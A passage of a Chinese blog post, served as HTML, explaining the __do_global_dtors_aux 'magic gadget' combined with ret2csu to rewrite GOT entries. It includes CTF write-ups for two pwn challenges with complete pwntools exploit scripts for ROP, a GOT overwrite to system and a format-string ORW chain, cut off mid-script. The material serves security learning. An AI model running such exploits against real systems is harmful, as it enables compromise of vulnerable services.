@@ -1,0 +1,265 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Magic_gadget | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Magic_gadget经过我师傅的一阵敲打，发现自己还是不能放松下来，还是有很多不足的。所以后续一段时间的文章，都是摘自我师傅博客后自己的理解。 这篇文章的原链接是：Magic_gadget | Hexo 1._do_global_dtors_aux函数常见于编译后的二进制文件（尤其是 C&#x2F;C++ 程序），它与全局对象析构和程序终止时的清理逻辑相关。说明是这个函数普遍存在于二进制文件中">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Magic_gadget">
+<meta property="og:url" content="http://example.com/2026/03/16/Magic-gadget/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="Magic_gadget经过我师傅的一阵敲打，发现自己还是不能放松下来，还是有很多不足的。所以后续一段时间的文章，都是摘自我师傅博客后自己的理解。 这篇文章的原链接是：Magic_gadget | Hexo 1._do_global_dtors_aux函数常见于编译后的二进制文件（尤其是 C&#x2F;C++ 程序），它与全局对象析构和程序终止时的清理逻辑相关。说明是这个函数普遍存在于二进制文件中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-03-16T14:02:29.000Z">
+<meta property="article:modified_time" content="2026-03-17T12:12:19.920Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/03/16/Magic-gadget/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Magic_gadget',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">Magic_gadget</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Magic-gadget"><a href="#Magic-gadget" class="headerlink" title="Magic_gadget"></a>Magic_gadget</h1><p>经过我师傅的一阵敲打，发现自己还是不能放松下来，还是有很多不足的。所以后续一段时间的文章，都是摘自我师傅博客后自己的理解。</p>
+<p>这篇文章的原链接是：<a target="_blank" rel="noopener" href="https://khighl.github.io/2025/04/15/magic_gadget/">Magic_gadget | Hexo</a></p>
+<p>1.<strong>_do_global_dtors_aux</strong>函数常见于编译后的二进制文件（尤其是 C&#x2F;C++ 程序），它与全局对象析构和程序终止时的清理逻辑相关。说明是这个函数<strong>普遍存在</strong>于二进制文件中。<br>2.<strong>_libc_csu_init</strong> 作为初始化函数,普遍存在于二进制文件中。</p>
+<p>所以本文的手法，就是基于通过上面两个函数的结合来达到的。</p>
+<p>我们现在看一下<code>_do_global_dtors_aux</code>函数在ida里的具体体现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011C0 __do_global_dtors_aux proc near         ; DATA XREF: .fini_array:__do_global_dtors_aux_fini_array_entry↓o</span><br><span class="line">.text:00000000004011C0                 endbr64</span><br><span class="line">.text:00000000004011C4                 cmp     cs:completed_8061, 0</span><br><span class="line">.text:00000000004011CB                 jnz     short locret_4011E0</span><br><span class="line">.text:00000000004011CD                 push    rbp</span><br><span class="line">.text:00000000004011CE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011D1                 call    deregister_tm_clones</span><br><span class="line">.text:00000000004011D6                 mov     cs:completed_8061, 1</span><br><span class="line">.text:00000000004011DD                 pop     rbp</span><br><span class="line">.text:00000000004011DE                 retn</span><br></pre></td></tr></table></figure>
+
+<p>其实在ida里的表现不是很明显，可以具体看一下gdb里的汇编，具体实现了什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00:0000│     0x400518 ◂— add dword ptr [rbp - 0x3d], ebx</span><br><span class="line">01:0008│     0x400520 ◂— ret </span><br><span class="line">02:0010│     0x400528 ◂— nop dword ptr [rax + rax]</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，这里是往rbp-0x3d里加了ebx。后面跟着ret。那么这里有什么用呢？</p>
+<p>如果我们给rbp赋值为某个函数的got表+0x3d，那么rbp-0x3d就会正正好好变成一个函数的got表。此时，如果我们还能控制ebx的值为system与该函数的偏移量的话，那么我们就可以实现一个改写got表的作用。</p>
+<p>那么怎么实现rbp和ebx的值的控制呢？</p>
+<p>这里就需要结合ret2csu的手法了。不过由于libc偏移版本的不确定。所以得出来的offset可能是负值，此时用p64()包裹解析可能有错误。所以这里需要我们手动补码。</p>
+<p>下面给出两道题。</p>
+<h2 id="广东强网杯-2021-个人决赛-hardof"><a href="#广东强网杯-2021-个人决赛-hardof" class="headerlink" title="[广东强网杯 2021 个人决赛]hardof"></a><code>[广东强网杯 2021 个人决赛]hardof</code></h2><p>链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/833">广东强网杯 2021 个人决赛]hardof - NSSCTF</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0x50u</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，程序相当简单。而且存在一个及其明显的栈溢出。相信大家的一般思想都是打ret2libc。但是我们可以通过ida里看出来，这里不存在输出函数。也就是说，我们根本输出不了某个函数的真实地址。那这个时候magic_gadget就派上用场了。我们可以通过劫持程序返回至**_do_global_dtors_aux**，控制rbp为alarm+0x3d，ebx&#x3D;libc.sym.system - libc.sym.alarm，这样就可以不通过泄露libc基地址而直接修改alarm的got表指向的函数为system了。天才般的设想。然后只需要控制rdi指向的地址是&#x2F;bin&#x2F;sh\x00的地址就可以getshell了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] 之前尝试了xshell远程链接虚拟据，打gdb动调的时候需要加上。正常打虚拟机的时候不需要。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28373)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">magic = <span class="number">0x400518</span></span><br><span class="line">csu1 = <span class="number">0x4005da</span></span><br><span class="line">csu2 = <span class="number">0x4005c0</span></span><br><span class="line">bss = <span class="number">0x601800</span></span><br><span class="line">got = <span class="number">0x601018</span> <span class="comment">#syscall</span></span><br><span class="line">offset = <span class="number">0x10000000000000000</span> + libc.sym.system - libc.sym.alarm</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(csu1) + p64(offset) + p64(got+<span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(magic) + p64(<span class="number">0x400532</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(offset))</span><br><span class="line">io.send(pl1)</span><br><span class="line">pause()</span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(csu1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got.read) + p64(<span class="number">0</span>) + p64(bss) + p64(<span class="number">8</span>) + p64(csu2) + p64(<span class="number">0x400532</span>)</span><br><span class="line">io.send(pl2)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">rdi = <span class="number">0x4005e3</span></span><br><span class="line">ret = <span class="number">0x4005e4</span></span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(ret) + p64(rdi) + p64(bss) + p64(elf.plt.alarm)</span><br><span class="line">io.send(pl3)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过发送pl1来判断是否成功改写got表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /home/xizi/Desktop/Magic_gadget/actf/pwn:</span><br><span class="line">GOT protection: Partial RELRO | Found 2 GOT entries passing the filter</span><br><span class="line">[0x601018] alarm@GLIBC_2.2.5 -&gt; 0x7ffff784f550 (system) ◂— test rdi, rdi</span><br><span class="line">[0x601020] read@GLIBC_2.2.5 -&gt; 0x7ffff7910140 (read) ◂— lea rax, [rip + 0x2e0891]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，此时我们的alarm的got成功指向了system。</p>
+<p>这里加pause()的原因是，如果不加pause()，那么发送的payload太快，会导致远端打不通。</p>
+<h2 id="鹏城杯-2022-one"><a href="#鹏城杯-2022-one" class="headerlink" title="[鹏城杯 2022]one"></a><code>[鹏城杯 2022]one</code></h2><p>由于不知道远端的libc版本，所以这道题目前只打通了本地。</p>
+<p>链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2423">鹏城杯 2022]one - NSSCTF</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里程序先是会给我们输入起初点的栈地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>login()函数里存在printf()可以泄露出程序基址。由于程序只清空了s的8字节。所以当我们填满8字节后，缺少<code>\x00</code>就会导致printf泄露出栈上存在的残留数据。这里刚好可以泄露出pro_base。（由于不清楚libc基址，所以用ubuntu22.04打的时候，不换依赖的话，是得不出pro_base。可以换成libc-2.27的来打本地。）</p>
+<p>然后回到main函数是很明显存在一个栈上的格式化字符串漏洞的。但是这里缓冲区大小足足有0x810，而我们只能写入0x200大小。所以不存在溢出。不过我们可以通过printf函数来修改返回地址+泄露libc基地址来获取flag。</p>
+<p>同时这题开了沙箱保护，所以我们需要考虑打orw。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>这里的沙箱正常禁用了exec和execveat系列的函数，而且不允许32位的函数的使用。所以就是一个正常的orw。</p>
+<p>这里还有一个难点，就是<code>close(1)</code>。也就是说，这里把标准输出关了。所以我们根本利用不了格式化字符串漏洞来泄露libc基地址。</p>
+<p>那应该怎么办呢？</p>
+<p>这里magic_gadget起到了特别大的作用。首先我们要知道stdout，这个指针指向了_IO_2_1_stdout结构体。也就是说，通过close(1)，我们stdout指向的结构体的功能是实现不了的。所以我们可以通过改写stdout指针指向__IO_2_1_stderr，来恢复回显。这样当我们利用write来输出内容的时候，就可以改文件描述符为2。这样就可以恢复回显了。</p>
+<p>实现起来，就是通过magic_gadget改stdout指针为_IO_2_1_stderr。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,24616)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift:&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">rbp = stack + <span class="number">0x810</span></span><br><span class="line">ret = rbp + <span class="number">0x8</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello aaaaaaaa&#x27;</span>)</span><br><span class="line">start = u64(io.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pie = start - <span class="number">0x11a0</span></span><br><span class="line">csu1 = pie + <span class="number">0x153a</span></span><br><span class="line">csu2 = pie + <span class="number">0x1520</span></span><br><span class="line">magic = pie+<span class="number">0x1272</span></span><br><span class="line">pop_rdi = pie + <span class="number">0x1543</span></span><br><span class="line">leave = pie + <span class="number">0x14d7</span></span><br><span class="line">success(<span class="built_in">hex</span>(pie))</span><br><span class="line">offset = libc.sym._IO_2_1_stderr_ - libc.sym._IO_2_1_stdout_</span><br><span class="line">success(<span class="built_in">hex</span>(offset&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">pl1 = fmtstr_payload(<span class="number">6</span>, &#123;rbp:stack+<span class="number">0x170</span>-<span class="number">8</span>,ret:leave &#125;, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">pl1 = pl1.ljust(<span class="number">0x170</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pl1 += p64(csu1) + p64(offset&amp;<span class="number">0xffffffff</span>) + p64(elf.sym.stdout + pie+<span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(magic) + p64(pie+elf.sym.main)</span><br><span class="line">pl1 = pl1.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.send(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift:&#x27;</span>)</span><br><span class="line">new_stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(new_stack))</span><br><span class="line">new_rbp = new_stack + <span class="number">0x810</span></span><br><span class="line">new_ret = new_rbp + <span class="number">8</span></span><br><span class="line">success(<span class="built_in">hex</span>(new_ret))</span><br><span class="line">offset_main = pie+elf.sym.main&amp;<span class="number">0xff</span></span><br><span class="line">success(<span class="built_in">hex</span>(offset_main))</span><br><span class="line">pl2 = <span class="string">b&#x27;%3$p&#x27;</span> </span><br><span class="line">pl2 += <span class="string">f&#x27;%<span class="subst">&#123;offset_main-<span class="number">14</span>+<span class="number">1</span>&#125;</span>c%9$hhn&#x27;</span>.encode()</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pl2 += p64(new_stack-<span class="number">8</span>)</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello aaaaaaaa\n&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym.read-<span class="number">17</span></span><br><span class="line">r = base + libc.sym.read</span><br><span class="line">o = base + libc.sym.<span class="built_in">open</span></span><br><span class="line">w = base + libc.sym.write</span><br><span class="line">pop_rsi = base + <span class="number">0x23eea</span></span><br><span class="line">pop_rdx = base + <span class="number">0x1b96</span></span><br><span class="line">bss = pie + <span class="number">0x4020</span> + <span class="number">0x500</span></span><br><span class="line">io.send(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span 